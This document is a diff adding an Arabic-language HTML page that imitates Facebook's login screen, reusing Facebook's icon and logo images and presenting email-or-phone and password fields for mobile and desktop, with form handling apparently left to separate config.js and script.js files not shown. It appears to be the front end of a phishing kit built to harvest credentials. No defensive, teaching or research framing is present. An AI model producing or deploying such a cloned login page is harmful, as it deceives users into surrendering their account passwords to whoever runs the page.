@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول إلى فيسبوك</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+    <link rel="stylesheet" href="style.css">
+    <script src="config.js" defer></script>
+</head>
+<body>
+    <div id="loading" class="loading-screen">
+        <div class="spinner"></div>
+    </div>
+    
+    <div class="main-container">
+        <!-- Mobile Version -->
+        <div class="mobile-view">
+            <div class="mobile-header">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/vg8VYFYitqe.png" class="mobile-logo">
+            </div>
+            <div class="login-card-mobile">
+                <form id="loginForm">
+                    <div class="input-wrapper">
+                        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autocomplete="email" required>
+                        <div class="input-icon">📧</div>
+                    </div>
+                    <div class="input-wrapper">
+                        <input type="password" id="pass" placeholder="كلمة المرور" autocomplete="current-password" required>
+                        <div class="input-icon">🔒</div>
+                    </div>
+                    <button type="submit" class="login-btn">تسجيل الدخول</button>
+                    <div class="forgot-password">
+                        <a href="#">نسيت كلمة المرور؟</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Desktop Version -->
+        <div class="desktop-view">
+            <div class="left-section">
+                <div class="hero-image">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/VxXi1bb7A1T.png" alt="">
+                </div>
+            </div>
+            <div class="right-section">
+                <div class="login-card">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="logo">
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <label>البريد الإلكتروني أو رقم الهاتف</label>
+                            <input type="text" id="email" autocomplete="email" required>
+                        </div>
+                        <div class="input-group">
+                            <label>كلمة المرور</label>
+                            <input type="password" id="pass" autocomplete="current-password" required>
+                        </div>
+                        <button type="submit" class="login-button">تسجيل الدخول</button>
+                        <div class="divider">
+                            <span>أو</span>
+                        </div>
+                        <button type="button" class="create-account">إنشاء حساب جديد</button>
+                    </form>
+                    <div class="footer-links">
+                        <a href="#">إنشاء صفحة</a>
+                        <a href="#">الشروط والأحكام</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
